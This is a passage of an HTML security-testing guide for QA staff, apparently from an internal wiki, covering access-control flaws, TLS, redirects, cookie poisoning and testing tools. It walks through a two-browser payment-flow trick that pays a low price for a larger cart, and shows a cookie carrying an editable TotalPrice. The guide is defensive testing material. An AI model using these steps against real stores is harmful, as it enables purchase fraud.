+        <p>There were couple of defects that got exposed in our application. Users could view the order confirmation page of other users, by just manipulating the order number in the URL. This was wrong since the order confirmation page consisted of user's personal information (address, name etc.). Also, a user could skip intermediate steps that would charge him extra (for say delivery etc.) by just modifying the page call on post method.</p>
+        <p>More gravely, a user was taken directly to the payment confirmation page, without even going through the payment gateway, by modifying some post method calls and playing around with the browser's javascript.</p>
+        <p></p>
+        <p>Also, we must not leave around hidden pages or exposed files expecting people to be unaware of it. Tools such as Nikto can help you identify the vulnerabilities.</p>
+        <p></p>
+        <p><span style="text-decoration: underline;">Tools/aids:</span></p>
+        <p><a href="http://www.cirt.net/nikto2">Nikto</a> is a web scanning tool that informs you of URL access vulnerabilities if they exist. A video of the tutorial to how to use it is given <a href="http://www.youtube.com/watch?v=UwzamgJ6Qt4">here</a>. However, do not blindly accept the results, as there may be some false alarms. Make sure you cross-verify the results once.</p>
+        <p></p>
+    </div>
+    <div style="padding: 10px;"></div>
+    <div style="background-color: #f5f5f5; border: 1px solid black; padding: 10px;">
+        <p><a name="layer"></a><span style="font-size: 12pt;"><strong>Insufficient transport layer protection</strong></span></p>
+        <p><span style="font-size: 12pt;"><strong>&nbsp;</strong></span></p>
+        <p>As discussed earlier, it is important to understand the underlying systems in your application.</p>
+        <p>Our application used SSL/TLS layers. One of the ways of ensuring we use the minimal protection is by checking the version is as latest as possible.</p>
+        <p>TLS 1.1 onwards <a href="http://luxsci.com/blog/is-ssltls-really-broken-by-the-beast-attack-what-is-the-real-story-what-should-i-do.html">BEAST</a> and <a href="http://en.wikipedia.org/wiki/Cipher_block_chaining#Cipher-block_chaining_.28CBC.29">Cipher block chaining</a> attacks were handled.</p>
+        <p></p>
+        <p><span style="text-decoration: underline;">Tools/aids:</span></p>
+        <p><a class="active_link" href="http://en.wikipedia.org/wiki/Transport_Layer_Security" title="http://en.wikipedia.org/wiki/Transport_Layer_Security">Transport Layer Security - Wikipedia, the free encyclopedia</a></p>
+        <p><a href="https://addons.mozilla.org/en-us/firefox/addon/calomel-ssl-validation/" title="https://addons.mozilla.org/en-us/firefox/addon/calomel-ssl-validation/">Calomel SSL Validation :: Add-ons for Firefox</a> is a tool to determine the grade of your website's SSL certificate</p>
+        <p><a href="http://sslinstallcheck.entrust.net/SIC/jsp/MainWebAddress.jsp" title="http://sslinstallcheck.entrust.net/SIC/jsp/MainWebAddress.jsp">Entrust</a> is similar to Calomel validator. It is also used to determine the SSL certificate details and check for any warnings etc.</p>
+        <p></p>
+    </div>
+    <div style="padding: 10px;"></div>
+    <div style="background-color: #f5f5f5; border: 1px solid black; padding: 10px;">
+        <p><a name="redirects"></a><span style="font-size: 12pt;"><strong>Unvalidated redirects and forwards</strong></span></p>
+        <p><span style="font-size: 12pt;"><strong>&nbsp;</strong></span></p>
+        <p><span style="font-family: 'comic sans ms', sans-serif;"><em>A certain Mr.X runs a well-known travel agency. I needed a travel policy and asked him for help. He pulled out a visiting card (that was handed to him by a random policy salesman). I trusted the brandname of the travel agency, and based on its credibility, I approached the random salesman. Well, the policy salesman was a swindler, and I blamed the big travel agency for it. They directed me to a person whose credibility was not validated. The brand is not in my good books anymore for sure.</em></span></p>
+        <p></p>
+        <p>So, avoid the use of unnecessary redirects or forwards from your website, that may lead an innocent user to an unvalidated, malicious site.</p>
+        <p>It is important to make sure all the external sites your redirects are leading to are validated and noted in a whitelist of acceptable values.</p>
+        <p>To test, it is a good idea to run a spider test against your website. Spidering crawls your website and mentions all the URLs that are within or outside the scope of the web application domain.</p>
+        <p></p>
+        <p><span style="text-decoration: underline;">Tools/aids:</span></p>
+        <p><a class="active_link" href="http://code.google.com/p/zaproxy/" title="http://code.google.com/p/zaproxy/">Zaproxy -&nbsp; OWASP ZAP</a> is a web application penetration tool which can be used for spidering. A video of the demo can be found <a href="http://www.youtube.com/watch?v=C7c50FJ8Cvo&amp;feature=plcp" title="http://www.youtube.com/watch?v=C7c50FJ8Cvo&amp;feature=plcp">here</a>.</p>
+        <p><a href="http://websecuritytool.codeplex.com/" title="http://websecuritytool.codeplex.com/">Watcher</a> is an add-on to <a href="http://www.fiddler2.com/fiddler2/">Fiddler</a>. It acts as a web security testing tool and passive vulnerability scanner. Though it is fairly straightforward to use, you can use this only on Windows platform.</p>
+        <p></p>
+    </div>
+    <div style="padding: 10px;"></div>
+    <div style="background-color: #f5f5f5; border: 1px solid black; padding: 10px;">
+        <p><a name="cookie"></a><span style="font-size: 12pt;"><strong>Cookie poisoning</strong></span></p>
+        <p><span style="font-size: 12pt;"><strong>&nbsp;</strong></span></p>
+        <p><span style="font-family: 'comic sans ms', sans-serif;"><em>The laundry man assigns you a ticket that would let you get back your clothes that you dropped off at his place. Now think, someone else got hold of the details in your laundry ticket and created a copy of it. That's not all, in this new ticket he created, he changed the 'total value' to a "special discount". Since he had all the details with him, the laundry man gave him all your clothes and a good discount. D'oh!</em></span></p>
+        <p></p>
+        <p>There could be multiple levels of misuse of information stored in cookies.</p>
+        <p>It is important to take a look at the description of the cookie (that can be captured by <a class="active_link" href="http://www.wireshark.org/download.html" title="http://www.wireshark.org/download.html">Wireshark</a>) and notice if it looks anything like this:</p>
+        <p><span style="color: #993366;"><em>GET /store/purchase.asp?checkout=yes HTTP/1.1 Host: mywebsite.com </em></span></p>
+        <p><span style="color: #993366;"><em><span>&nbsp; Accept: */* Referrer: </span><a class="jive-link-external-small" href="http://mywebsite.com/showprods.asp">http://mywebsite.com/showprods.asp</a><span> </span></em></span></p>
+        <p><span style="color: #993366;"><em>&nbsp; Cookie: SESSIONID=59022ASDD223SA2321; CartSize=2; </em></span></p>
+        <p><span style="color: #993366;"><em>&nbsp; Item1=270; </em></span><span style="color: #993366;"><em>Item2=230; TotalPrice=500;</em></span></p>
+        <p>Here is a dynamic page which includes a cookie that contains the following vulnerable parameters:</p>
+        <p>SESSIONID (which is a unique identification string that associates the user with the site), CartSize (how many items are in my cart), the price of each item and the TotalPrice.</p>
+        <p>Imagine what an attacker can do to this kind of data, maybe even a free purchase? <img class="jive_macro jive_emote" src="/images/emoticons/happy.png" jivemacro="emoticon" ___jive_emoticon_name="happy" /></p>
+        <p>Since programmers rely on cookies as a location for storing parameters, all parameter attacks including SQL Injection, Cross-Site Scripting, and Buffer Overflow can be executed using cookie poisoning.</p>
+        <p></p>
+        <p>To prevent cookie poisoning, you could protect your cookies by encryption before they are sent to a user's computer. A digital signature could help in validating the content in all future communications between the sender and the recipient. If the content is tampered with, the signature will no longer match the content and will be refused access by the server.</p>
+        <p></p>
+        <p><span style="text-decoration: underline;">Tools/aids:</span></p>
+        <p><a href="http://www.cgisecurity.com/lib/CookiePoisoningByline.pdf">This pdf </a>will show you some amazing techniques of cracking cookie information</p>
+        <p><a href="http://www.wireshark.org/download.html" title="http://www.wireshark.org/download.html">Wireshark</a> , <a class="active_link" href="https://addons.mozilla.org/en-us/firefox/addon/tamper-data/" title="https://addons.mozilla.org/en-us/firefox/addon/tamper-data/">Tamper Data :: Add-ons for Firefox</a> and <a href="http://www.parosproxy.org/download.shtml" title="http://www.parosproxy.org/download.shtml">Parosproxy</a> can be used to intercept and capture cookie information.</p>
+        <p>Check <a href="http://www.youtube.com/watch?v=24SghQhqJ_E">this video</a> for an example of cookie poisoning attack.</p>
+        <p>An interesting video<a href="http://www.youtube.com/watch?v=P_u3g95bzIE&amp;feature=relmfu"> here</a> demonstrates session hijacking using cookie poisoning and other vulnerabilities on a site.</p>
+        <p>A video <a href="http://www.youtube.com/watch?v=7HMnMqzkXu4&amp;feature=related">here</a> shows how Facebook cookies can be exploited to hijack your account.</p>
+        <p></p>
+        <p></p>
+    </div>
+    <div style="padding: 10px;"></div>
+    <div style="background-color: #f5f5f5; border: 1px solid black; padding: 10px;">
+        <p><a name="business"></a><span style="font-size: 12pt;"><strong>Business workflow vulnerabilities</strong></span></p>
+        <p><span style="font-size: 12pt;"><strong>&nbsp;</strong></span></p>
+        <p>It is absolutely essential to know your business workflow in-and-out. Most of the security breaches are guaranteed to be developed here.</p>
+        <p>Similar was the situation in our project. It is absolutely a must for the devs and QAs to interact and discuss the implementation, especially around critical pieces of code. The more we discussed the implementation details of the functionality, the more we could think from the attacker's perspective.</p>
+        <p></p>
+        <p>Here is an example from our project.</p>
+        <p>In our application, the user account was assigned an order number. This was to enable the user to view his cart whenever he logs in. Also, we generate a hash key which includes the amount, order number etc. before we send the details to the payment gateway. The payment gateway not only validates the amount, order number passed across, but also the hash key against them.</p>
+        <p>Sounds like a very common and secured scenario, doesn't it? Now take a look at the following steps:</p>
+        <p>- Add the cheapest item to cart and proceed till the payment page. Do not pay yet. Remember at this point the post data and the hash key are generated and just ready to be pushed to the payment gateway.</p>
+        <p>- Open another browser and continue from the cart. Add more products to the cart and proceed till payment page, but do not pay. Now in the backend, the order status would be 'ready to pay', and neither of the browsers violates this.</p>
+        <p>- Now go back to the first browser and choose to pay. This will push the post data from the browser with lower price.</p>
+        <p>- The payment gateway takes in the data that was sent to it from the application where the amount, order no. etc. perfectly matched the hash key. So it did not complain and processed the payment for the order no..</p>
+        <p>On the other end, our application assumed everything must have been good and hence took the order status to completion.</p>
+        <p>BOOM! I could have paid for 1 product and bought the whole store in that price.</p>
+        <p></p>
+        <p>Hmmm..so modification of the cart led to all this confusion. Let's do this - we will not allow user to change cart if he reaches the 'ready to pay' state. He will have to either pay for the order he chose, or start over with a fresh order again.</p>
+        <p>That sounds awesome! Well, not really.</p>
+        <p>- Add the cheapest item to the cart and proceed till payment page. Do not pay yet. Your data is ready to be posted to the payment gateway.</p>
+        <p>- Now in another browser, continue form the cart again. But do not reach payment page. This means your order is no more in 'ready to pay' state. Also, functionally we cannot stop a person from going to another page to edit his details. So the order status changes too.</p>
+        <p>- Now since the order status is as normal as a first purchase, I can add more stuff to the cart. Now proceed to payment page but do not pay.</p>
+        <p>- Now in the first browser again, pay the lower amount.</p>
+        <p>BOOM!</p>
+        <p></p>
+        <p>So, there are multiple possible solutions to a problem. It becomes highly important to list out all the possible fixes and discuss their pros and cons. And again, don't forget to put in an attacker's perspective.</p>
+        <p>It is essential that we read all the payment gateway documentation, understand PCI DSS norms, and be in constant touch with the payment gateway company to make sure we provide good solutions.</p>
+        <p></p>
+        <p>Tamper data allowed me to capture every request and response across the web application, payment gateway and bank. Now I split the requests in two parts: Outgoing from our application to the payment gateway, Incoming from the payment gateway to our application.</p>
+        <p>Both will have their data points to check. Outgoing may consist of extra parameters, that may not be mandatorily sent by our application, but can they be altered, like 'discounts'?</p>
+        <p>Similarly for incoming requests, can we alter even failing data to say the transaction was successful?</p>
+        <p></p>
+        <p>As it stands, it's all in how you think and proceed. You could be using any tool as it suits your requirements.</p>
+        <p></p>
+    </div>
+    <div style="padding: 10px;"></div>
+    <div style="background-color: #f5f5f5; border: 1px solid black; padding: 10px;">
+        <p><a name="tools"></a><span style="font-size: 12pt;"><strong>Summary of tools</strong></span></p>
+        <p><span style="font-size: 12pt;"><strong>&nbsp;</strong></span></p>
+        <p>Though the real tool is your mind at work, here are some more that can come handy while testing.</p>
+        <p></p>
+        <p>1. <strong>Firebug</strong></p>
+        <p>Everybody knows about <a href="https://addons.mozilla.org/en-us/firefox/addon/firebug/">this classic one</a>. You can edit, debug, monitor request traffic. Also try a hand at <a href="https://addons.mozilla.org/en-us/firefox/addon/firecookie/" title="https://addons.mozilla.org/en-us/firefox/addon/firecookie/">Firecookie</a>, an extension on Firebug to monitor and tamper your cookie data.</p>
+        <p></p>
+        <p>2. <strong>TamperData</strong></p>
+        <p>This has to be one of my favourite tools. It is a simple Firefox plugin that allows you to intercept, pause and modify the requests and responses. You can use this to inject scripts, modify cookies, change post data etc.</p>
+        <p>You could download the tool from <a href="https://addons.mozilla.org/en-us/firefox/addon/tamper-data/" title="https://addons.mozilla.org/en-us/firefox/addon/tamper-data/">Tamper Data :: Add-ons for Firefox</a>. it is pretty simple to use, and you can start using it as soon as you open it.</p>
+        <p></p>
+        <p>3. <strong>Websecurify</strong></p>
+        <p><a href="https://chrome.google.com/webstore/detail/websecurify/emclbdbpcnhmopfkidjhlinikkohlkpn" title="https://chrome.google.com/webstore/detail/websecurify/emclbdbpcnhmopfkidjhlinikkohlkpn">Chrome Web Store - Websecurify</a> is a Chrome plugin that lists all the general security flaws in a website. All you need to do is enter the target URL, and you shall have a report of vulnerabilities in the site.</p>
+        <p>It can list possible SQL injections, XSS, CSRF, file upload attacks. It also mentions the directory listing, email disclosures and banner disclosures, path disclosures etc. It is a good tool to run a sanity test. However, do check the injectons etc. are not false alarms.</p>
+        <p></p>
+        <p>4. <strong>Watcher</strong></p>
+        <p><a href="http://websecuritytool.codeplex.com/" title="http://websecuritytool.codeplex.com/">Watcher</a> is an add-on to <a href="http://www.fiddler2.com/fiddler2/">Fiddler</a>. It acts as a web security testing tool and passive vulnerability scanner. Though it is fairly straightforward to use, you can use this only on Windows platform.</p>
+        <p><a href="http://blog.eviltester.com/2009/04/learn-security-testing-with-fiddler-and-watcher.html" title="http://blog.eviltester.com/2009/04/learn-security-testing-with-fiddler-and-watcher.html">Evil Tester: Learn Security Testing with Fiddler and Watcher</a> shall show you how the tool can be used.</p>
+        <p></p>
+        <p>5. <strong>Zed Access Proxy</strong> (or ZAP)</p>
+        <p>OWASP ZAP acts a proxy that your application can traverse through, thus letting it capture and act upon requests/responses.</p>
+        <p>If you have automated selenium/webdriver tests, you could route them through ZAP proxy. You can also automate the analysis/reporting.</p>
+        <p>Find the below videos to help you guide from setting up to using its features.</p>
+        <p><a href="http://www.youtube.com/watch?v=qZkxiRDRIAY&amp;feature=relmfu" title="http://www.youtube.com/watch?v=qZkxiRDRIAY&amp;feature=relmfu">Zed Attack Proxy - Setup Guide</a></p>
+        <p><a href="http://www.youtube.com/watch?v=IaVdjWGZQ4A&amp;feature=plcp" title="http://www.youtube.com/watch?v=IaVdjWGZQ4A&amp;feature=plcp">Zed Attack Proxy - Settings and Options</a></p>
+        <p><a href="http://www.youtube.com/watch?v=vNTX-aTVsmI&amp;feature=plcp" title="http://www.youtube.com/watch?v=vNTX-aTVsmI&amp;feature=plcp">Zed Attack Proxy - Interface Walkthrough</a></p>
+        <p><a href="http://www.youtube.com/watch?v=rmbi-VbIK6I&amp;feature=plcp" title="http://www.youtube.com/watch?v=rmbi-VbIK6I&amp;feature=plcp">How to Fuzz Websites for Cross-Site Scripting (XSS) Using Zed Attack Proxy (ZAP)</a></p>
+        <p><a href="http://www.youtube.com/watch?v=5RmHyZkQo_8&amp;feature=plcp" title="http://www.youtube.com/watch?v=5RmHyZkQo_8&amp;feature=plcp">Zed Attack Proxy - Fuzzing for SQL Injection Flaws</a></p>
+        <p><a href="http://www.youtube.com/watch?v=lXoJQz6uIQ0&amp;feature=plcp" title="http://www.youtube.com/watch?v=lXoJQz6uIQ0&amp;feature=plcp">Zed Attack Proxy - Intercepting Traffic and Modifying with Breakpoints</a></p>
+        <p><a href="http://www.youtube.com/watch?v=C7c50FJ8Cvo&amp;feature=plcp" title="http://www.youtube.com/watch?v=C7c50FJ8Cvo&amp;feature=plcp">Zed Attack Proxy - Spidering a Website</a></p>
+        <p><a href="http://www.youtube.com/watch?v=9WG8c--eYOs&amp;feature=plcp" title="http://www.youtube.com/watch?v=9WG8c--eYOs&amp;feature=plcp">Zed Attack Proxy - Using Brute Force to Locate Hidden Directories</a></p>
+        <p></p>
+        <p>6. <strong>Burp suite</strong></p>
+        <p>Burp suite is another tool which can perform a range of tests. It also is an intercepting proxy tool that passively capture the requests/responses, and also actively give you the ability to act upon them.</p>
+        <p>Find the complete list of features and details <a href="http://portswigger.net/burp/">here</a>.</p>
+        <p>Check the following videos to help you through using its features:</p>
+        <p><a href="http://www.youtube.com/watch?v=JmAk1OVwp-4" title="http://www.youtube.com/watch?v=JmAk1OVwp-4">Burp Suite Basics For Software Testing</a></p>
+        <p><a href="http://www.youtube.com/watch?v=ft5MSmf42Kw&amp;feature=relmfu" title="http://www.youtube.com/watch?v=ft5MSmf42Kw&amp;feature=relmfu">Burp Suite Repeater &amp;amp; Intruder Tutorial</a></p>
+        <p><a href="http://www.youtube.com/watch?v=nqFzab1si8g&amp;feature=related" title="http://www.youtube.com/watch?v=nqFzab1si8g&amp;feature=related">Burp Cross Site Request Forgery Testing</a></p>
+        <p><a href="http://www.youtube.com/watch?v=vjb-MrUbvps" title="http://www.youtube.com/watch?v=vjb-MrUbvps">brute-force authentication Attack with Burp suite</a></p>
+        <p></p>
+        <p>7. <strong>Hackbar</strong></p>
+        <p>Hackbar is also a Firefox plugin that enables you to put in some XSS or SQL injections. You could also use to test hashing or URL decoding. You would need some knowledge of scripting beforehand.</p>
+        <p>You could download the tool from <a href="https://addons.mozilla.org/en-US/firefox/addon/hackbar/" title="https://addons.mozilla.org/en-US/firefox/addon/hackbar/">HackBar :: Add-ons for Firefox</a></p>
+        <p><a href="http://www.youtube.com/watch?v=CNoYR2jnEww" title="http://www.youtube.com/watch?v=CNoYR2jnEww">Firefox plugin Tamper Data &eacute;s Hackbar - YouTube</a> shows a video of attacks performed by using Tamper data and Hackbar tools.</p>
+        <p></p>
+    </div>
+</div>
+<div style="padding: 10px;"></div>
+<div style="background-color: white; border: 1px solid black; padding: 10px;">
+    <p><strong>&nbsp;</strong></p>
+    <p><span style="font-family: calibri, verdana, arial, sans-serif;"><strong>Have to remember:</strong></span></p>
+    <p><span style="font-family: calibri, verdana, arial, sans-serif;">...to prioritise. This is the trickiest part. Having the knowledge is good, but remember your application may not require all the protection. You may just be overkilling.</span></p>
+    <p><span style="font-family: calibri, verdana, arial, sans-serif;">...to maintain communication between BA, QA and devs and go deep. Even if it means understanding the implementation details, it is worth it.</span></p>
+    <p></p>
+    <p><span style="font-family: calibri, verdana, arial, sans-serif;"><strong>You can test your skills at:</strong></span></p>
+    <p><span style="font-family: calibri, verdana, arial, sans-serif;">There are some sites to just aid you with checking your knowledge. They have all the vulnerabilities in place for you to play around with.</span></p>
+    <p><span style="font-family: calibri, verdana, arial, sans-serif;"><a href="http://www.webscantest.com/" title="http://www.webscantest.com/">http://www.webscantest.com/</a></span></p>
+    <p><span style="font-family: calibri, verdana, arial, sans-serif;"><a href="http://xss.triviasecurity.org/xss/" title="http://xss.triviasecurity.org/xss/">http://xss.triviasecurity.org/xss/</a></span></p>
+    <p><span style="font-family: calibri, verdana, arial, sans-serif;"><a href="http://www.hackertest.net/" title="http://www.hackertest.net/">http://www.hackertest.net/</a></span></p>
+    <p></p>
+    <p><span style="font-family: calibri, verdana, arial, sans-serif;">The following are the people I have gathered knowledge from:</span></p>
+    <p><span style="font-family: calibri, verdana, arial, sans-serif;"><a class="jive_macro jive_macro_user" jivemacro="user" ___default_attr="2729" _title="Sri Prasanna K" data-orig-content="Sri Prasanna K">Sri Prasanna K</a>, <a class="jive_macro jive_macro_user" jivemacro="user" ___default_attr="3904" _title="John Stojanovski" data-orig-content="John Stojanovski">John Stojanovski</a>, <a class="jive_macro jive_macro_user" jivemacro="user" ___default_attr="2032" _title="Sriram Narayanan" data-orig-content="Sriram Narayanan">Sriram Narayanan</a>, <a class="jive_macro jive_macro_user" jivemacro="user" ___default_attr="4436" _title="Shirish Padalkar" data-orig-content="Shirish Padalkar">Shirish Padalkar</a>, <a class="jive_macro jive_macro_user" jivemacro="user" ___default_attr="4872" _modifiedtitle="true" _title="Darrell Grainger" data-orig-content="Darrell Grainger">Darrell Grainger</a>, <a class="jive_macro jive_macro_user" jivemacro="user" ___default_attr="3895" _title="Kenny Lin" data-orig-content="Kenny Lin">Kenny Lin</a></span></p>
+    <p></p>
+</div>
